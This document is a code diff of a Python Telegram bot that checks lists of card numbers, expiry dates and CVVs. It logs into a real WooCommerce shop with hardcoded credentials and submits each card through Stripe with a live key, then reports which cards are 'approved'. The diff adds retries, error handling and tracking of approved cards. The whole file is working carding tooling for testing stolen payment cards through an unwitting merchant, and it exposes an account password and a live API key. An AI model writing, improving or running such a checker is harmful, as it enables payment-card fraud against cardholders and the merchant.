@@ -16,7 +16,7 @@ CHANNEL_ID = -1002555306699
 GROUP_CHAT_ID = "@sigma6627272"
 MESSAGE_ID = 3
 
-EMAIL = "m3hgcool@gmail.com"
+EMAIL = "m3hg3c@gmail.com"
 PASSWORD = "M3hg123!A"
 STRIPE_PK = "pk_live_51J0pV2Ai5aSS7yFafQNdnFVlTHEw2v9DQyCKU4hs0u4R1R3MDes03yCFFeWlp0gEhVavJQQwUAJvQzSC3jSTye8Z00UACjDsfG"
 
@@ -26,7 +26,7 @@ AJAX_URL = 'https://blackdonkeybeer.com/?wc-ajax=wc_stripe_create_and_confirm_se
 ORIGIN = 'https://blackdonkeybeer.com'
 
 HEADERS = {
-    'User-Agent': 'Mozilla/5.0',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
     'Accept': '*/*',
     'Connection': 'keep-alive'
 }
@@ -36,12 +36,8 @@ approved_data = {}
 
 def parse_combo_line(line):
     patterns = [
-        r'(\d{13,16})\|(\d{2})/(\d{2,4})\|(\d{3,4})\|(.+?)\|(.+?)\|(.+?)\|(.+?)\|(.+?)\|.*?\|(.+?)\|(.+?)\|?',
-        r'(\d{13,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})',
-        r'(\d{13,16})\|(\d{2})/(\d{2,4})\|(\d{3,4})\|(.+?)\|(.+?)\|(.+?)\|(.+?)\|(.+?)\|',
-        r'(\d{13,16})\|(\d{2})/(\d{2,4})\|(\d{3,4})\|([^|]+)\|([^|]+)\|([^|]+)\|([^|]+)\|([^|]+)\|([^|]+)\|([^|]+)',
-        r'(\d{13,16})\|(\d{2})/(\d{2,4})\|(\d{3,4})\|([^|]+)\|([^|]+)\|([^|]+)\|([^|]+)\|([^|]+)\|([^|]+)\|([^|]+)\|([^|]+)',
-        r'(\d{13,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})\|([^|]+)\|([^|]+)\|([^|]+)\|([^|]+)\|([^|]+)\|([^|]+)\|([^|]+)\|([^|]+)'
+        r'(\d{13,16})\|(\d{2})/(\d{2,4})\|(\d{3,4})',
+        r'(\d{13,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
     ]
     for pattern in patterns:
         match = re.match(pattern, line)
@@ -80,49 +76,72 @@ def get_ajax_nonce(session):
     raise Exception("AJAX nonce not found")
 
 def process_combo(combo):
-    session = fresh_login_session()
-    ajax_nonce = get_ajax_nonce(session)
-    parsed = parse_combo_line(combo)
-    if not parsed:
-        return "ERROR", "Invalid combo format", combo
-    number, month, year, cvv, full = parsed
-    stripe_data = {
-        'type': 'card',
-        'card[number]': number,
-        'card[exp_month]': month,
-        'card[exp_year]': year,
-        'card[cvc]': cvv,
-        'billing_details[address][postal_code]': str(random.randint(10000, 99999)),
-        'key': STRIPE_PK,
-    }
-    stripe_resp = session.post('https://api.stripe.com/v1/payment_methods', headers={
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'User-Agent': HEADERS['User-Agent'],
-    }, data=stripe_data)
-    stripe_json = stripe_resp.json()
-    if 'error' in stripe_json:
-        return "DECLINED", stripe_json['error']['message'], full
-    payment_method_id = stripe_json['id']
-    payload = {
-        'action': 'create_and_confirm_setup_intent',
-        'wc-stripe-payment-method': payment_method_id,
-        'wc-stripe-payment-type': 'card',
-        '_ajax_nonce': ajax_nonce,
-    }
-    wc_resp = session.post(AJAX_URL, headers={
-        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'X-Requested-With': 'XMLHttpRequest',
-        'Referer': CHECK_URL,
-        'Origin': ORIGIN,
-        'User-Agent': HEADERS['User-Agent'],
-    }, data=payload)
-    json_resp = wc_resp.json()
-    if json_resp.get('success') and json_resp.get('data', {}).get('status') == 'succeeded':
-        return "APPROVED", "Approved", full
-    elif json_resp.get('data', {}).get('status') == 'requires_action':
-        return "DECLINED", "3DS Secure Required", full
-    else:
-        return "DECLINED", "Declined", full
+    try:
+        session = fresh_login_session()
+        ajax_nonce = get_ajax_nonce(session)
+        parsed = parse_combo_line(combo)
+        if not parsed:
+            return "ERROR", "Invalid combo format", combo
+        number, month, year, cvv, full = parsed
+
+        stripe_data = {
+            'type': 'card',
+            'card[number]': number,
+            'card[exp_month]': month,
+            'card[exp_year]': year,
+            'card[cvc]': cvv,
+            'billing_details[address][postal_code]': str(random.randint(10000, 99999)),
+            'key': STRIPE_PK,
+        }
+
+        stripe_resp = session.post('https://api.stripe.com/v1/payment_methods', headers={
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'User-Agent': HEADERS['User-Agent'],
+        }, data=stripe_data)
+
+        stripe_json = stripe_resp.json()
+        if 'error' in stripe_json:
+            return "DECLINED", stripe_json['error']['message'], full
+
+        payment_method_id = stripe_json['id']
+        payload = {
+            'action': 'create_and_confirm_setup_intent',
+            'wc-stripe-payment-method': payment_method_id,
+            'wc-stripe-payment-type': 'card',
+            '_ajax_nonce': ajax_nonce,
+        }
+
+        wc_resp = session.post(AJAX_URL, headers={
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Referer': CHECK_URL,
+            'Origin': ORIGIN,
+            'User-Agent': HEADERS['User-Agent'],
+        }, data=payload)
+
+        json_resp = wc_resp.json()
+
+        if not json_resp.get('success') and 'Unable to verify your request' in str(json_resp):
+            ajax_nonce = get_ajax_nonce(session)
+            payload['_ajax_nonce'] = ajax_nonce
+            wc_resp = session.post(AJAX_URL, headers={
+                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'X-Requested-With': 'XMLHttpRequest',
+                'Referer': CHECK_URL,
+                'Origin': ORIGIN,
+                'User-Agent': HEADERS['User-Agent'],
+            }, data=payload)
+            json_resp = wc_resp.json()
+
+        if json_resp.get('success') and json_resp.get('data', {}).get('status') == 'succeeded':
+            return "APPROVED", "Approved", full
+        elif json_resp.get('data', {}).get('status') == 'requires_action':
+            return "DECLINED", "3DS Secure Required", full
+        else:
+            return "DECLINED", "Declined", full
+
+    except Exception as e:
+        return "ERROR", str(e), combo
 
 async def run_blocking(func, *args):
     loop = asyncio.get_event_loop()
@@ -181,6 +200,8 @@ async def send_result(chat_id, context, user, card, status, msg):
 ⚡ Checked By : <b>{tag}</b>
 """
     await context.bot.send_message(chat_id, text, parse_mode="HTML")
+    if status == "APPROVED":
+        approved_data[chat_id].append(card)
 
 async def single_check(update, context):
     chat_id = update.effective_chat.id
@@ -200,38 +221,37 @@ async def single_check(update, context):
     except Exception as e:
         await update.message.reply_text(f"❌ Failed: <code>{str(e)}</code>", parse_mode="HTML")
 
-async def handle_buttons(update, context):
+async def callback_handler(update, context):
     query = update.callback_query
-    chat_id = query.message.chat.id
     await query.answer()
-    if query.data == "startcheck":
-        combos = combo_data.get(chat_id, [])
+    chat_id = query.message.chat.id
+    user = update.effective_user
+
+    if query.data == "stats":
+        total = len(combo_data.get(chat_id, []))
+        approved = len(approved_data.get(chat_id, []))
+        await query.edit_message_text(f"Total: {total} | Approved: {approved}", reply_markup=keyboard())
+
+    elif query.data == "startcheck":
+        combos = combo_data.get(chat_id)
         if not combos:
-            await query.edit_message_text("No combos loaded.")
+            await query.edit_message_text("Upload your combo.txt first.", reply_markup=keyboard())
             return
-        await query.edit_message_text("Processing combos...")
-        user = query.from_user
+
+        await query.edit_message_text(f"Started checking {len(combos)} combos...")
         for combo in combos:
             status, msg, card = await run_blocking(process_combo, combo)
             await send_result(chat_id, context, user, card, status, msg)
-        if approved_data.get(chat_id):
-            with open("approved.txt", "w") as f:
-                for c in approved_data[chat_id]:
-                    f.write(c + "\n")
-            await context.bot.send_document(chat_id, InputFile("approved.txt"))
-            os.remove("approved.txt")
-        await context.bot.send_message(chat_id, "Check complete.")
-    elif query.data == "stats":
-        approved = approved_data.get(chat_id, [])
-        total = combo_data.get(chat_id, [])
-        await context.bot.send_message(chat_id, f"✅ Approved: {len(approved)}\n❌ Total: {len(total)}")
+
+        await context.bot.send_message(chat_id, "✅ Done!")
 
 def main():
     app = ApplicationBuilder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("chk", single_check))
     app.add_handler(MessageHandler(filters.Document.ALL, upload_file))
-    app.add_handler(CallbackQueryHandler(handle_buttons))
+    app.add_handler(CallbackQueryHandler(callback_handler))
+    print("Bot is running...")
     app.run_polling()
 
 if __name__ == "__main__":
